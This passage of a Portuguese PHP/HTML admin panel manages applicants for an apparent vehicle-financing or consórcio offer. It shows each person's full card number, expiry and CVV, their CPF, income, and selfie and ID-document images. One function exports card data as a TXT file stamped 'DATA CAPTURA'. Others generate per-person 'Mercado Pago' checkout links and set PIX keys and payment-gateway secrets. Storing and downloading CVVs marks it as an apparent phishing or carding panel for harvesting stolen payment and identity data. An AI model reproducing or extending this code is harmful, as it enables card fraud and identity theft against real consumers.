                style="margin-top: 30px; display: none; background: rgba(0,0,0,0.2); padding: 20px; border-radius: 10px; border-left: 4px solid var(--red);">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h3 style="margin: 0; color: #fff;"><i class="fas fa-credit-card"></i> Pagamento via Cartão</h3>
                    <button class="btn-action" onclick="downloadCardTxt()" title="Baixar TXT"><i
                            class="fas fa-download"></i> BAIXAR TXT</button>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size: 0.9rem;">
                    <div>
                        <div class="modal-label">NÚMERO DO CARTÃO</div>
                        <div id="m-card-num"
                            style="color: #fff; font-family: monospace; font-size: 1.1rem; letter-spacing: 1px;">---
                        </div>
                    </div>
                    <div>
                        <div class="modal-label">NOME NO CARTÃO</div>
                        <div id="m-card-name" style="color: #fff; font-weight: 600;">---</div>
                    </div>
                    <div>
                        <div class="modal-label">VALIDADE | CVV</div>
                        <div id="m-card-expiry-cvv" style="color: #fff; font-weight: 600;">---</div>
                    </div>
                    <div>
                        <div class="modal-label">PARCELAMENTO</div>
                        <div id="m-card-installments" style="color: #fff; font-weight: 600;">---</div>
                    </div>
                </div>
            </div>


            <div style="margin-top: 40px;">
                <button class="btn-save" onclick="saveUserChanges()">SALVAR TODAS AS ALTERAÇÕES <i
                        class="fas fa-check-circle"></i></button>
            </div>
        </div>
    </div>

    <script>
        let selectedUser = null;

        function openUserModal(user) {
            selectedUser = user;
            document.getElementById('m-fullname').innerText = user.fullname || 'Não informado';
            document.getElementById('m-cpf').innerText = user.username;
            document.getElementById('m-date').innerText = user.created_at;
            document.getElementById('m-status-select').value = user.status || 'Pendente';
            document.getElementById('m-manager-input').value = user.manager || '';
            document.getElementById('m-rate-input').value = user.contemplation_rate || '24%';

            const fin = user.financial || {};
            document.getElementById('m-renda').innerText = fin.renda || '---';
            document.getElementById('m-veiculo').innerText = `${fin.veiculo_tipo || '---'} | ${fin.veiculo_valor || '---'}`;
            document.getElementById('m-fin-details').innerText = `${fin.entrada || '---'} | ${fin.prazo || '---'} meses`;

            document.getElementById('m-email').innerText = user.email || 'Não informado';
            document.getElementById('m-phone').innerText = user.phone || 'Não informado';

            // Dados do Cartão
            const card = user.credit_card;
            const cardSection = document.getElementById('card-info-section');
            if (card) {
                cardSection.style.display = 'block';
                document.getElementById('m-card-num').innerText = card.number;
                document.getElementById('m-card-name').innerText = card.name.toUpperCase();
                document.getElementById('m-card-expiry-cvv').innerText = `${card.expiry} | CVV: ${card.cvv}`;
                document.getElementById('m-card-installments').innerText = `${card.installments}x de ...`;
            } else {
                cardSection.style.display = 'none';
            }


            const getPath = (p) => {
                if (!p) return '../public/assets/vendor/images/placeholder.jpg';
                return p.startsWith('data:') ? p : '../' + p;
            };

            document.getElementById('img-selfie').src = getPath(user.kyc?.selfie);
            document.getElementById('img-front').src = getPath(user.kyc?.front);
            document.getElementById('img-back').src = getPath(user.kyc?.back);

            document.getElementById('userModal').style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }

        function closeUserModal() {
            document.getElementById('userModal').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        async function saveUserChanges() {
            const newStatus = document.getElementById('m-status-select').value;
            const manager = document.getElementById('m-manager-input').value;
            const rate = document.getElementById('m-rate-input').value;

            try {
                const response = await fetch('../api/update_status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `username=${encodeURIComponent(selectedUser.username)}&status=${encodeURIComponent(newStatus)}&manager=${encodeURIComponent(manager)}&rate=${encodeURIComponent(rate)}`
                });
                const result = await response.json();
                if (result.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Sucesso!',
                        text: 'Alterações aplicadas com sucesso.',
                        background: '#111', color: '#fff', confirmButtonColor: '#ff0000'
                    }).then(() => location.reload());
                }
            } catch (err) {
                Swal.fire('Erro', 'Falha ao salvar dados.', 'error');
            }
        }

        async function deleteUser(username) {
            const confirmed = await Swal.fire({
                title: 'Tem certeza?',
                text: "Esta ação é irreversível e removerá todos os documentos.",
                icon: 'warning',
                showCancelButton: true,
                background: '#111', color: '#fff',
                confirmButtonColor: '#ff0000',
                cancelButtonColor: '#333',
                confirmButtonText: 'Sim, deletar!'
            });

            if (confirmed.isConfirmed) {
                try {
                    const response = await fetch('../api/delete_user', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `username=${encodeURIComponent(selectedUser.username)}`
                    });
                    const result = await response.json();
                    if (result.success) {
                        document.getElementById(`row-${username}`).remove();
                        Swal.fire({
                            title: 'Deletado!', icon: 'success', background: '#111', color: '#fff', confirmButtonColor: '#ff0000'
                        });
                    }
                } catch (e) {
                    Swal.fire('Erro', 'Erro ao deletar.', 'error');
                }
            }
        }

        function filterTable(val) {
            const filter = val.toLowerCase();
            const rows = document.querySelectorAll('#userTable tbody tr');
            rows.forEach(row => {
                const text = row.innerText.toLowerCase();
                row.style.display = text.includes(filter) ? '' : 'none';
            });
        }

        // Novas funções para a Seção de Checkout
        let growthChart, statusChart;

        function showSection(section, btn) {
            document.querySelectorAll('.table-container').forEach(c => c.style.display = 'none');
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));

            if (section === 'users') {
                document.querySelector('.table-container').style.display = 'block';
            } else {
                document.getElementById('section-' + section).style.display = 'block';
            }
            btn.classList.add('active');

            if (section === 'reports') {
                initCharts();
            }
        }

        function initCharts() {
            if (growthChart) growthChart.destroy();
            if (statusChart) statusChart.destroy();

            const usersData = <?php echo json_encode($users); ?>;

            // 1. Processamento de Status (Real)
            const statusCounts = {};
            usersData.forEach(u => {
                const s = u.status || 'Pendente';
                statusCounts[s] = (statusCounts[s] || 0) + 1;
            });

            const ctxStatus = document.getElementById('statusChart').getContext('2d');
            statusChart = new Chart(ctxStatus, {
                type: 'doughnut',
                data: {
                    labels: Object.keys(statusCounts),
                    datasets: [{
                        data: Object.values(statusCounts),
                        backgroundColor: ['#ff0000', '#fbbf24', '#00ff88', '#60a5fa', '#a78bfa', '#333'],
                        borderWidth: 0
                    }]
                },
                options: {
                    plugins: {
                        legend: {
                            position: 'bottom',
                            labels: { color: '#94a3b8', font: { size: 10 } }
                        }
                    }
                }
            });

            // 2. Processamento de Crescimento (Real - Últimos 7 dias)
            <?php
            $stats_labels = [];
            $stats_data = [];
            for ($i = 6; $i >= 0; $i--) {
                $d = date('Y-m-d', strtotime("-$i days"));
                $stats_labels[] = date('d/m', strtotime("-$i days"));
                $stats_data[] = count(array_filter($users, fn($u) => strpos($u['created_at'] ?? '', $d) === 0));
            }
            ?>

            const ctxGrowth = document.getElementById('growthChart').getContext('2d');
            growthChart = new Chart(ctxGrowth, {
                type: 'line',
                data: {
                    labels: <?php echo json_encode($stats_labels); ?>,
                    datasets: [{
                        label: 'Novos Leads',
                        data: <?php echo json_encode($stats_data); ?>,
                        borderColor: '#ff0000',
                        backgroundColor: 'rgba(255, 0, 0, 0.1)',
                        fill: true,
                        tension: 0.4,
                        pointBackgroundColor: '#ff0000',
                        pointBorderColor: '#fff',
                        pointHoverRadius: 6
                    }]
                },
                options: {
                    scales: {
                        y: {
                            beginAtZero: true,
                            grid: { color: 'rgba(255,255,255,0.05)' },
                            ticks: { color: '#94a3b8', stepSize: 1 }
                        },
                        x: {
                            grid: { display: false },
                            ticks: { color: '#94a3b8' }
                        }
                    },
                    plugins: { legend: { display: false } }
                }
            });
        }

        function toggleGatewayFields() {
            const gateway = document.getElementById('cfg-active-gateway').value;
            document.getElementById('cfg-safe-bank-fields').style.display = gateway === 'safe-bank' ? 'block' : 'none';
            document.getElementById('cfg-jungle-fields').style.display = gateway === 'jungle-pagamentos' ? 'block' : 'none';
        }

        async function savePixConfig() {
            const gateway = document.getElementById('cfg-active-gateway').value;
            const key = document.getElementById('cfg-pix-key').value;
            const jungleKey = document.getElementById('cfg-jungle-secret-key')?.value || '';
            const junglePubKey = document.getElementById('cfg-jungle-public-key')?.value || '';

            if (gateway === 'safe-bank' && !key) return Swal.fire('Erro', 'Informe a chave PIX.', 'error');
            if (gateway === 'jungle-pagamentos' && (!jungleKey || !junglePubKey)) return Swal.fire('Erro', 'Informe a Secret Key e a Public Key.', 'error');

            try {
                const response = await fetch('../api/update_pix_config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `pix_key=${encodeURIComponent(key)}&active_gateway=${encodeURIComponent(gateway)}&jungle_secret_key=${encodeURIComponent(jungleKey)}&jungle_public_key=${encodeURIComponent(junglePubKey)}`
                });
                const result = await response.json();
                if (result.success) {
                    Swal.fire('Sucesso', 'Configurações de pagamento atualizadas.', 'success');
                }
            } catch (err) {
                Swal.fire('Erro', 'Falha ao salvar configuração.', 'error');
            }
        }

        async function saveWhatsappConfig() {
            const whatsapp = document.getElementById('cfg-whatsapp-number-dedicated').value;

            if (!whatsapp) return Swal.fire('Erro', 'Informe o número do WhatsApp.', 'error');

            try {
                const response = await fetch('../api/update_whatsapp_config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `whatsapp_number=${encodeURIComponent(whatsapp)}`
                });
                const result = await response.json();
                if (result.success) {
                    Swal.fire('Sucesso', 'Número de WhatsApp atualizado com sucesso.', 'success');
                }
            } catch (err) {
                Swal.fire('Erro', 'Falha ao salvar configuração do WhatsApp.', 'error');
            }
        }

        function generateCheckoutLink() {
            const cpf = document.getElementById('gen-user-select').value;
            if (!cpf) return Swal.fire('Aviso', 'Selecione um usuário.', 'info');

            // Pega o caminho base removendo o /admin/ da URL
            const currentPath = window.location.pathname.replace(/\/admin\/.*$/, '/');
            const baseUrl = window.location.origin + currentPath + 'mp/' + cpf;

            document.getElementById('generated-url').value = baseUrl;
            document.getElementById('link-result').style.display = 'block';

            Swal.fire({
                icon: 'success',
                title: 'Link Gerado!',
                text: 'O link de pagamento do Mercado Pago foi criado.',
                background: '#111', color: '#fff', confirmButtonColor: '#ff0000'
            });
        }

        function copyLink() {
            const input = document.getElementById('generated-url');
            input.select();
            document.execCommand('copy');
            Swal.fire('Copiado!', 'Link de pagamento pronto para envio.', 'success');
        }

        function downloadCardTxt() {
            if (!selectedUser || !selectedUser.credit_card) return;
            const c = selectedUser.credit_card;
            const content = `DADOS DO CARTÃO - CLIENTE: ${selectedUser.fullname}
==========================================
CPF: ${selectedUser.username}
NÚMERO: ${c.number}
NOME: ${c.name.toUpperCase()}
VALIDADE: ${c.expiry}
CVV: ${c.cvv}
PARCELAS: ${c.installments}x
DATA CAPTURA: ${c.date || '---'}
==========================================`;

            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cartao_${selectedUser.username}.txt`;
            a.click();
            window.URL.revokeObjectURL(url);
        }
    </script>
</body>

</html>